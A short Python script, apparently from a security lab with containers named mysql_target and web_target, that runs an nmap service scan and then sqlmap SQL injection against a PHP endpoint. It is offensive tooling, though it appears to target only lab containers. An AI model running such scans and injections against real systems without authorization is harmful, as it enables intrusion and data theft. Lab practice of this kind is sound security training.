# attack_scripts/main.py

import subprocess

def run_nmap(target):
    """
    Run nmap to discover open ports and services on the target.
    """
    print(f"Running nmap scan on {target}...")
    subprocess.run(["nmap", "-sV", target], check=True)

def run_sqlmap(target):
    """
    Run sqlmap on the vulnerable endpoint parameter.
    Make sure the URL and parameters match actual web app.
    """
    print(f"Running sqlmap against {target}...")
    subprocess.run(["sqlmap",
                    "-u", f"http://{target}/index.php?id=1",
                    "--batch"],
                   check=True)

if __name__ == "__main__":
    # 1. Scan the MySQL container if desired
    run_nmap("mysql_target")
    
    # 2. Attempt SQL injection against the PHP front end
    run_sqlmap("web_target:80")

